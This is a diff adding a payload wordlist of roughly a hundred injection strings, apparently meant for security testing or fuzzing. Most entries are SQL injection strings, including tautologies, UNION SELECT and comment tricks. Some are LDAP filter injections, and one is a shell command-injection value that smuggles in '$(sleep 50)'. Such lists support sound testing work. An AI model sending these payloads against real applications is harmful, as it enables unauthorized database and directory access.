@@ -1,0 +1,98 @@
+'sqlvuln
+'+sqlvuln
+sqlvuln;
+(sqlvuln)
+a' or 1=1--
+"a"" or 1=1--"
+ or a = a
+a' or 'a' = 'a
+1 or 1=1
+exec(@s)
+' or 1=1
+‘ or 1=1 --
+x' AND userid IS NULL; --
+x' AND email IS NULL; --
+anything' OR 'x'='x
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND members.email IS NULL; --
+x' OR full_name LIKE '%Bob%
+23 OR 1=1
+'%20or%20''='
+'%20or%20'x'='x
+%20or%20x=x
+')%20or%20('x'='x
+0 or 1=1
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+ or 0=0 #"
+or 0=0 #
+' or 1=1--
+" or 1=1--
+' or '1'='1'--
+' or 1 --'
+or 1=1--
+or%201=1
+or%201=1 --
+' or 1=1 or ''='
+ or 1=1 or ""=
+' or a=a--
+ or a=a
+') or ('a'='a
+) or (a=a
+hi or a=a
+hi or 1=1 --"
+hi' or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+"hi"") or (""a""=""a"
+'hi' or 'x'='x';
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+--sp_password
+\x27UNION SELECT
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+to_timestamp_tz
+tz_offset
+<>"'%;)(&+
+'%20or%201=1
+%27%20or%201=1
+%20$(sleep%2050)
+%20'sleep%2050'
+char%4039%41%2b%40SELECT
+&apos;%20OR
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+(
+%28
+)
+%29
+&
+%26
+!
+%21
+' or 1=1 or ''='
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+a' or 3=3--
+"a"" or 3=3--"
+' or 3=3
+‘ or 3=3 --
